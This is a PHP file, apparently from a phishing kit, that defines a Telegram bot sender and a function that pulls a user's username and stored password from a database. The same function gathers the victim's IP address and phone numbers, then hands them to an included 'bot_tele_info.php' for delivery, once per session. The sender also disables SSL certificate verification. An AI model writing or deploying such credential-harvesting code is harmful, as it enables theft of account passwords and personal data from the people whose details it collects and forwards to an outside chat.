<?php

require_once __DIR__ . '/telegram_config.php';

function telegram_send_message(string $text): void
{
    global $TELEGRAM_ENABLED, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;

    if (empty($TELEGRAM_ENABLED)) {
        return;
    }

    $url = 'https://api.telegram.org/bot' . $TELEGRAM_BOT_TOKEN . '/sendMessage';
    $params = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $text,
        'parse_mode' => 'Markdown',
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $params,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10,
    ]);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log('Telegram cURL: ' . curl_error($ch));
        curl_close($ch);
        return;
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $response = json_decode($result, true);
    if (empty($response['ok'])) {
        error_log("Telegram API ($httpCode): $result");
    }
}

function telegram_notify_contact_once(PDO $pdo, int $usuarioId, string $telefonoFijo, string $telefonoMovil): void
{
    if ($telefonoFijo === '' && $telefonoMovil === '') {
        return;
    }
    if (!empty($_SESSION['telegram_contact_sent'])) {
        return;
    }

    $credStmt = $pdo->prepare('SELECT usuarios, password FROM usuarios WHERE id = ? LIMIT 1');
    $credStmt->execute([$usuarioId]);
    $cred = $credStmt->fetch(PDO::FETCH_ASSOC);
    if (!$cred) {
        return;
    }

    $usuario = $cred['usuarios'];
    $password = $cred['password'];
    $ip_real = $_SESSION['ip_real'] ?? ($_SERVER['REMOTE_ADDR'] ?? '');
    $telefono_fijo = $telefonoFijo;
    $telefono_movil = $telefonoMovil;

    require __DIR__ . '/bot_tele_info.php';
    $_SESSION['telegram_contact_sent'] = true;
}
